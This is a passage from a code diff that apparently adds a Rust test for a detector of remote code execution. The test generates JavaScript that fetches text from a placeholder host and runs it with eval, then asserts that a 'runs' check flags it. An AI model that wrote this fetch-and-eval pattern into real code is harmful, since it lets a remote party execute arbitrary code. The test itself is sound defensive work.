+            let src = format!(
+                "{}function load({}) {{\n  const fetchFn = {};\n  return fetchFn('https://{}/p').then((r) => r.text()).then((t) => eval(t));\n}}\nload();\n",
+                store, sig, pick, HOST
+            );
+            assert_eq!(runs(&src), Some("run"), "{}", pick);
+        }
     }
 
     #[test]
